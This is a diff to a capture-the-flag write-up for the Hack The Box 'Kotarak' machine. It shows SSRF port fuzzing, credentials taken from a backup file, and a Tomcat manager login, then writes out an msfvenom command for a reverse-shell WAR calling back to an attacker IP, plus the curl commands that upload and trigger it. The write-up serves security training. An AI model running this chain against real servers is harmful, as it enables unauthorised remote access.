@@ -196,8 +196,11 @@ Testing with a `file://` schema returns a "try harder" message.
 It seems like this message is returned probably based on a blacklist looking for `file` and other keywords. After playing around with some other payloads, we can see that we can access the server localhost with a specified port.
 ![20a46db48ae7815794244914b332b742.png](../_resources/20a46db48ae7815794244914b332b742.png)
 
-This makes me curious if there are any services running on localhost, so I fuzz for all ports...
+This makes me curious if there are any services running on localhost, so I fuzz for all ports using `wfuzz`...
 ![2757a1f75ef5f4978bf174665816161e.png](../_resources/2757a1f75ef5f4978bf174665816161e.png)
+
+ ...and find tons!
+
 ![9160ee01486f8007b2589778a5cd3670.png](../_resources/9160ee01486f8007b2589778a5cd3670.png)
 ![097799245af4d1255e134d1f438ed59d.png](../_resources/097799245af4d1255e134d1f438ed59d.png)
 ![b14be501f1d122e90d3bedfedea6456b.png](../_resources/b14be501f1d122e90d3bedfedea6456b.png)
@@ -205,10 +208,60 @@ This makes me curious if there are any services running on localhost, so I fuzz 
 ![8dfd709b41b48ff010035d26fcb984d0.png](../_resources/8dfd709b41b48ff010035d26fcb984d0.png)
 ![05d0eda43aed3adbdc975e9b66078fe5.png](../_resources/05d0eda43aed3adbdc975e9b66078fe5.png)
 
- ...and find tons!
+This widens our attack surface by a lot! Ports 320 and 888 are most interesting to me, but I will investigate the others as well to make sure I am not missing anything. We also now know there seems to be a MySQL service running on localhost port 3306.
 
-This widens our attack surface TONS! Ports 320 and 888 are most interesting to me, but I will investigate the others as well to make sure I am not missing anything. We also now know there seems to be a MySQL service running on localhost port 3306.
+I try some default credentials for the login form on port 320 but didn't have any luck. I noticed there was an interesting file named `backup` on port 888 and a query parameter of `doc` when hovering over any of these items. I try to view `doc` but am served a blank page, likely because of something to do with me trying to request a file by the means of SSRF? So instead, I try downloading the file to my machine using `wget`. 
 
+I wasn't feeling very hopeful about this but to my surprise, it worked!
 
+![fa09f2cb5120402909fafa5d82f5a49e.png](../_resources/fa09f2cb5120402909fafa5d82f5a49e.png)
+![f1a7f61f739f8c6bed9553dc4feef7f4.png](../_resources/f1a7f61f739f8c6bed9553dc4feef7f4.png)
 
+We now have the credentials `admin:3@g01PdhB!`. I first tried these credentials on the super sensitive login page of localhost port 320 but this did not work. Hopefully these work on the Tomcat manager! I try visiting `http://kotarak.htb:8080/manager/html`, am served an authentication alert, and then successfuly login with the credentials we found.
+
+![484f820483c16339db02233ad1a9d22c.png](../_resources/484f820483c16339db02233ad1a9d22c.png)
+
+At this point, we can try to upload a `.war` reverse shell since we have admin access to the manager. I make a shell with `msfvenom` using the following command: `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.91 LPORT=1337 -f war > shell.war`
+
+Then upload it with:
+`curl --upload-file shell.war -u 'admin:3@g01PdhB!' "http://kotarak.htb:8080/manager/text/deploy?path=/shell"`
+
+And lastly activate the shell with:
+`curl http://kotarak.htb:8080/shell/`
+
+Tuh-duh! We are now `tomcat`! I upgrade the unstable shell using the python trick, followed by setting `TERM` and tty rows/columns. The integers used to set the tty rows and columns was returned from the command `stty -a`. Lastly, I background the shell with `^Z` and run `stty raw -echo; fg <ENTER> <ENTER>` which does some magic, allowing me to use `^L`, tab complete, etc. We now have a pretty darn fancy reverse shell.
+
+![dc40ac9902beb48fb4c93dd35c3cf864.png](../_resources/dc40ac9902beb48fb4c93dd35c3cf864.png)
+![35ed34f307c08dd8a1e8dae455d10f58.png](../_resources/35ed34f307c08dd8a1e8dae455d10f58.png)
+
+Now it is time to transfer linPEAS over to the box for some more enumeration.
+
+![ef626295d38d140c8b6ddc33532328ce.png](../_resources/ef626295d38d140c8b6ddc33532328ce.png)
+
+..
+
+![3f4af5d2676279e548727af1b54f1dd0.png](../_resources/3f4af5d2676279e548727af1b54f1dd0.png)
+
+backup file
+
+![f8275853fc6b11fb64433563fe467e6b.png](../_resources/f8275853fc6b11fb64433563fe467e6b.png)
+![3f9a6112b92fb0bb05031cbd63152bd6.png](../_resources/3f9a6112b92fb0bb05031cbd63152bd6.png)
+![228933f8b286dfd31ec2138d44f3d4e2.png](../_resources/228933f8b286dfd31ec2138d44f3d4e2.png)
+![02c8f210f84f0e7d40fff8284baf6839.png](../_resources/02c8f210f84f0e7d40fff8284baf6839.png)
+![d48da147566910c9a7e6ae345a006245.png](../_resources/d48da147566910c9a7e6ae345a006245.png)
+![3f2b720a73767cb6e13813f9c36e8946.png](../_resources/3f2b720a73767cb6e13813f9c36e8946.png)
+![7f223ffeacd153f71f5d9a8c2ef6f171.png](../_resources/7f223ffeacd153f71f5d9a8c2ef6f171.png)
+![16e345e9d8ea00dd1d0675d498991609.png](../_resources/16e345e9d8ea00dd1d0675d498991609.png)
+![b13855711f381d74ad4d1db754d95113.png](../_resources/b13855711f381d74ad4d1db754d95113.png)
+![904b001b74099d0f00ca17eebd84e4bf.png](../_resources/904b001b74099d0f00ca17eebd84e4bf.png)
+![043dd83b33220d6872310c10131d983d.png](../_resources/043dd83b33220d6872310c10131d983d.png)
+![35e66d24f375e3a855b6bceb24b8f229.png](../_resources/35e66d24f375e3a855b6bceb24b8f229.png)
+
+Organize these notes later:
+ - Cron possibly creating something in /tmp <- mdadm?
+ -  Tmux session
+ -  Old sudo version
+ -  MySQL (and others on localhost?)
+ -  Maybe SGID on /usr/bin/screen
+ -  backup file? /usr/share/info/dir.old 
 
